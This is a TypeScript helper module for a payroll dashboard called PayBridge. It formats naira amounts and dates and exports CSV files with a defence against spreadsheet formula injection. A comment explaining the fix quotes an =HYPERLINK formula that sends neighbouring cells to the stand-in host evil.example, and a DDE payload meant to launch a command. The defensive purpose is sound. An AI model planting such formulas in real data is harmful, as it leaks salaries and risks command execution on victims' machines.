/** Shared formatting helpers for the PayBridge dashboards. */

export function naira(value: number, opts: { decimals?: boolean } = {}): string {
  const fixed = opts.decimals ? 2 : 0;
  return (
    "₦" +
    value.toLocaleString("en-NG", {
      minimumFractionDigits: fixed,
      maximumFractionDigits: fixed,
    })
  );
}

/** ₦48.5m / ₦13.5m / ₦750k — for tiles and chart axes. */
export function nairaCompact(value: number): string {
  const abs = Math.abs(value);
  if (abs >= 1_000_000_000) return `₦${(value / 1_000_000_000).toFixed(2)}b`;
  if (abs >= 1_000_000) return `₦${(value / 1_000_000).toFixed(abs >= 10_000_000 ? 1 : 2)}m`;
  if (abs >= 1_000) return `₦${Math.round(value / 1_000)}k`;
  return naira(value);
}

export function pct(value: number, digits = 1): string {
  return `${value.toFixed(digits)}%`;
}

export function ratioPct(part: number, whole: number): number {
  if (!whole) return 0;
  return Math.min(100, Math.max(0, (part / whole) * 100));
}

const MONTHS = [
  "January",
  "February",
  "March",
  "April",
  "May",
  "June",
  "July",
  "August",
  "September",
  "October",
  "November",
  "December",
];

/** 28 August 2026 */
export function longDate(iso: string): string {
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return iso;
  return `${d.getDate()} ${MONTHS[d.getMonth()]} ${d.getFullYear()}`;
}

/** 28 Aug 2026 */
export function shortDate(iso: string): string {
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return iso;
  return `${d.getDate()} ${MONTHS[d.getMonth()].slice(0, 3)} ${d.getFullYear()}`;
}

/** 28 Aug 2026, 14:32 */
export function dateTime(iso: string): string {
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return iso;
  const hh = String(d.getHours()).padStart(2, "0");
  const mm = String(d.getMinutes()).padStart(2, "0");
  return `${shortDate(iso)}, ${hh}:${mm}`;
}

export function relativeTime(iso: string): string {
  const then = new Date(iso).getTime();
  if (Number.isNaN(then)) return iso;
  const diff = Date.now() - then;
  const mins = Math.round(diff / 60000);
  if (mins < 1) return "just now";
  if (mins < 60) return `${mins} min ago`;
  const hours = Math.round(mins / 60);
  if (hours < 24) return `${hours} hr ago`;
  const days = Math.round(hours / 24);
  if (days < 30) return `${days} day${days === 1 ? "" : "s"} ago`;
  return shortDate(iso);
}

export function daysBetween(fromIso: string, toIso: string): number {
  const a = new Date(fromIso).getTime();
  const b = new Date(toIso).getTime();
  return Math.max(0, Math.round((b - a) / 86_400_000));
}

export function initialsOf(name: string): string {
  return name
    .split(/\s+/)
    .filter(Boolean)
    .slice(0, 2)
    .map((part) => part[0]?.toUpperCase() ?? "")
    .join("");
}

export function maskAccount(number: string): string {
  const tail = number.slice(-4);
  return `•••• ${tail}`;
}

/** PB-BR-8FK21Q style references for mock records. */
export function makeReference(prefix: string): string {
  const stamp = Date.now().toString(36).toUpperCase().slice(-5);
  const rand = Math.floor(Math.random() * 36 ** 2)
    .toString(36)
    .toUpperCase()
    .padStart(2, "0");
  return `${prefix}-${stamp}${rand}`;
}

/**
 * CSV escaping, including formula-injection defence.
 *
 * THE VULNERABILITY THIS CLOSES (CWE-1236)
 * Every "Download" button in the dashboard exports data that users typed —
 * employee names, departments, exception notes. If a cell begins with =, +, -,
 * @, TAB or CR, Excel, Google Sheets and LibreOffice treat it as a FORMULA, not
 * text. So an employee whose "job title" is:
 *
 *   =HYPERLINK("https://evil.example/?x="&A1&A2&A3,"Click for payslip")
 *
 * exfiltrates neighbouring cells — colleagues' salaries — the moment a finance
 * user opens the export. Worse variants use DDE (=cmd|'/c calc'!A0) to attempt
 * command execution on the finance machine. The attacker needs no access to
 * PayBridge at all beyond one text field, and the payload executes inside the
 * victim's spreadsheet, entirely outside our security boundary.
 *
 * THE FIX: prefix a dangerous leading character with a single quote, which
 * spreadsheets read as "treat this cell as literal text". The quote is not
 * displayed as data content in the cell, so the export stays readable, and the
 * value is then quoted normally for CSV.
 *
 * WHY not strip the character instead: silently deleting a leading "-" would
 * corrupt legitimate negative numbers in a payroll export. Neutralising is
 * correct; mangling financial data is not.
 */
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

export function csvEscape(value: unknown): string {
  let s = value === null || value === undefined ? "" : String(value);

  // Never let a cell start life as a formula.
  if (s.length > 0 && FORMULA_TRIGGERS.includes(s[0])) {
    s = `'${s}`;
  }

  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** Client-side CSV download used by every "Download" action in the prototype. */
export function downloadCsv(filename: string, rows: Record<string, unknown>[]): void {
  if (!rows.length) return;
  const headers = Object.keys(rows[0]);
  const body = rows.map((row) => headers.map((h) => csvEscape(row[h])).join(","));
  const csv = [headers.join(","), ...body].join("\n");
  downloadFile(filename, csv, "text/csv;charset=utf-8;");
}

export function downloadFile(filename: string, contents: string, mime = "text/plain"): void {
  const blob = new Blob([contents], { type: mime });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}
